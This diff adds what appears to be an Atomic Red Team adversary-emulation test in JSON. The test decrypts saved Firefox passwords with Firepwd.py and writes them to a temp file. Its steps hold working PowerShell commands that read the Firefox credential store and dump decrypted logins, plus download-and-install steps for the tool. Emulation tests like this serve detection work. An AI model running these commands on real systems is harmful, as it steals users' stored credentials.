@@ -1,0 +1,441 @@
+{
+  "id": "dc9cd677-c70f-4df5-bd1c-f114af3c2381",
+  "name": "Decrypt Mozilla Passwords with Firepwd.py",
+  "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b7571a07-801c-4b95-8574-23c7ee926165",
+      "type": "execute-command",
+      "data": {
+        "command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{Firepwd_Path} -d $PasswordDBLocation \u003e #{Out_Filepath}\ncat #{Out_Filepath}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4d1eb102-5d07-41d3-98fb-b14e2fab9556",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "583e3deb-ed5d-40c8-b0f9-da6d8c57b507",
+      "name": "Check dependency 1/7",
+      "description": "Firepwd must exist at #{Firepwd_Path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "23fb7207-baaa-4928-9f23-f82ef5de2d33",
+      "name": "Resolve dependency 1/7",
+      "description": "Firepwd must exist at #{Firepwd_Path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f6de3166-c12a-461a-a7f4-8b8cfc426198",
+      "name": "Re-check dependency 1/7",
+      "description": "Firepwd must exist at #{Firepwd_Path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1d98c25c-b4b0-41d7-8844-810b5261ef3b",
+      "name": "Check dependency 2/7",
+      "description": "Firefox profile directory must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "412d89e4-3d3e-4194-abac-719abf0ef680",
+      "name": "Resolve dependency 2/7",
+      "description": "Firefox profile directory must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "05f6a5f3-1375-4e70-b02d-5b83d5a64847",
+      "name": "Re-check dependency 2/7",
+      "description": "Firefox profile directory must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5c1d2058-fceb-4ace-bf9d-3db517c59191",
+      "name": "Check dependency 3/7",
+      "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "eef2137f-58a8-4d88-a079-d7774679451b",
+      "name": "Resolve dependency 3/7",
+      "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "cdb59b10-c94c-45ab-8c94-9cc3de583e56",
+      "name": "Re-check dependency 3/7",
+      "description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ed446ccc-2eb8-451f-a06f-5be32838e6f4",
+      "name": "Check dependency 4/7",
+      "description": "Python must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1aae6187-783b-41b0-baa3-e8a2bdc82e9b",
+      "name": "Resolve dependency 4/7",
+      "description": "Python must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b30df2e9-7483-41d2-8b73-a10fa2efdf5f",
+      "name": "Re-check dependency 4/7",
+      "description": "Python must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0d84727b-e4be-4c1b-944a-045d058a52c9",
+      "name": "Check dependency 5/7",
+      "description": "Pip must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip -v) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a24266e8-e559-4138-a5d4-60eaf9075f34",
+      "name": "Resolve dependency 5/7",
+      "description": "Pip must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://bootstrap.pypa.io/ez_setup.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ez_setup.py\"      \ninvoke-webrequest \"https://bootstrap.pypa.io/get-pip.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\get-pip.py\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\ez_setup.py\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\get-pip.py\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9fee9f87-8ed7-4ded-9af8-ce3ba6976aa3",
+      "name": "Re-check dependency 5/7",
+      "description": "Pip must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip -v) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "978eccb5-fc46-4bf2-a30a-99ee07ef56ef",
+      "name": "Check dependency 6/7",
+      "description": "Pycryptodome library must be installed \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pycryptodome) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0f4e6694-4c1e-4894-a4bd-15a3161ccabb",
+      "name": "Resolve dependency 6/7",
+      "description": "Pycryptodome library must be installed \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"#{VS_CMD_Path}\"){pip install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "16791a98-9373-4765-abca-01a79f2649fe",
+      "name": "Re-check dependency 6/7",
+      "description": "Pycryptodome library must be installed \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pycryptodome) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9cd5d1f4-faf5-4c8f-9a4b-e24f6f501528",
+      "name": "Check dependency 7/7",
+      "description": "Pyasn1 library must be installed \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pyasn1) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1f8b32f1-beed-44dd-8ac4-16b1bf0c7a5b",
+      "name": "Resolve dependency 7/7",
+      "description": "Pyasn1 library must be installed \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"#{VS_CMD_Path}\"){pip install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "83c70567-96b4-44c7-8bd6-878d057c16b0",
+      "name": "Re-check dependency 7/7",
+      "description": "Pyasn1 library must be installed \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pyasn1) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "b7571a07-801c-4b95-8574-23c7ee926165",
+      "p": "on-success",
+      "o": "4d1eb102-5d07-41d3-98fb-b14e2fab9556"
+    },
+    {
+      "s": "b7571a07-801c-4b95-8574-23c7ee926165",
+      "p": "on-failure",
+      "o": "4d1eb102-5d07-41d3-98fb-b14e2fab9556"
+    },
+    {
+      "s": "583e3deb-ed5d-40c8-b0f9-da6d8c57b507",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "583e3deb-ed5d-40c8-b0f9-da6d8c57b507",
+      "p": "on-failure",
+      "o": "23fb7207-baaa-4928-9f23-f82ef5de2d33"
+    },
+    {
+      "s": "23fb7207-baaa-4928-9f23-f82ef5de2d33",
+      "p": "on-success",
+      "o": "f6de3166-c12a-461a-a7f4-8b8cfc426198"
+    },
+    {
+      "s": "f6de3166-c12a-461a-a7f4-8b8cfc426198",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "1d98c25c-b4b0-41d7-8844-810b5261ef3b",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "1d98c25c-b4b0-41d7-8844-810b5261ef3b",
+      "p": "on-failure",
+      "o": "412d89e4-3d3e-4194-abac-719abf0ef680"
+    },
+    {
+      "s": "412d89e4-3d3e-4194-abac-719abf0ef680",
+      "p": "on-success",
+      "o": "05f6a5f3-1375-4e70-b02d-5b83d5a64847"
+    },
+    {
+      "s": "05f6a5f3-1375-4e70-b02d-5b83d5a64847",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "5c1d2058-fceb-4ace-bf9d-3db517c59191",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "5c1d2058-fceb-4ace-bf9d-3db517c59191",
+      "p": "on-failure",
+      "o": "eef2137f-58a8-4d88-a079-d7774679451b"
+    },
+    {
+      "s": "eef2137f-58a8-4d88-a079-d7774679451b",
+      "p": "on-success",
+      "o": "cdb59b10-c94c-45ab-8c94-9cc3de583e56"
+    },
+    {
+      "s": "cdb59b10-c94c-45ab-8c94-9cc3de583e56",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "ed446ccc-2eb8-451f-a06f-5be32838e6f4",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "ed446ccc-2eb8-451f-a06f-5be32838e6f4",
+      "p": "on-failure",
+      "o": "1aae6187-783b-41b0-baa3-e8a2bdc82e9b"
+    },
+    {
+      "s": "1aae6187-783b-41b0-baa3-e8a2bdc82e9b",
+      "p": "on-success",
+      "o": "b30df2e9-7483-41d2-8b73-a10fa2efdf5f"
+    },
+    {
+      "s": "b30df2e9-7483-41d2-8b73-a10fa2efdf5f",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "0d84727b-e4be-4c1b-944a-045d058a52c9",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "0d84727b-e4be-4c1b-944a-045d058a52c9",
+      "p": "on-failure",
+      "o": "a24266e8-e559-4138-a5d4-60eaf9075f34"
+    },
+    {
+      "s": "a24266e8-e559-4138-a5d4-60eaf9075f34",
+      "p": "on-success",
+      "o": "9fee9f87-8ed7-4ded-9af8-ce3ba6976aa3"
+    },
+    {
+      "s": "9fee9f87-8ed7-4ded-9af8-ce3ba6976aa3",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "978eccb5-fc46-4bf2-a30a-99ee07ef56ef",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "978eccb5-fc46-4bf2-a30a-99ee07ef56ef",
+      "p": "on-failure",
+      "o": "0f4e6694-4c1e-4894-a4bd-15a3161ccabb"
+    },
+    {
+      "s": "0f4e6694-4c1e-4894-a4bd-15a3161ccabb",
+      "p": "on-success",
+      "o": "16791a98-9373-4765-abca-01a79f2649fe"
+    },
+    {
+      "s": "16791a98-9373-4765-abca-01a79f2649fe",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "9cd5d1f4-faf5-4c8f-9a4b-e24f6f501528",
+      "p": "on-success",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    },
+    {
+      "s": "9cd5d1f4-faf5-4c8f-9a4b-e24f6f501528",
+      "p": "on-failure",
+      "o": "1f8b32f1-beed-44dd-8ac4-16b1bf0c7a5b"
+    },
+    {
+      "s": "1f8b32f1-beed-44dd-8ac4-16b1bf0c7a5b",
+      "p": "on-success",
+      "o": "83c70567-96b4-44c7-8bd6-878d057c16b0"
+    },
+    {
+      "s": "83c70567-96b4-44c7-8bd6-878d057c16b0",
+      "p": "on-failure",
+      "o": "b7571a07-801c-4b95-8574-23c7ee926165"
+    }
+  ],
+  "tags": [
+    "T1555.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "Firepwd_Path",
+      "type": "string",
+      "description": "Filepath for Firepwd.py",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py"
+    },
+    {
+      "name": "Out_Filepath",
+      "type": "string",
+      "description": "Filepath to output results to",
+      "value": "$env:temp\\T1555.003Test8.txt"
+    },
+    {
+      "name": "VS_CMD_Path",
+      "type": "string",
+      "description": "Filepath to Visual Studio Build Tools Command prompt",
+      "value": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"
+    },
+    {
+      "name": "Python_Path",
+      "type": "string",
+      "description": "Filepath to python",
+      "value": "C:\\Program Files\\Python310\\python.exe"
+    }
+  ]
+}
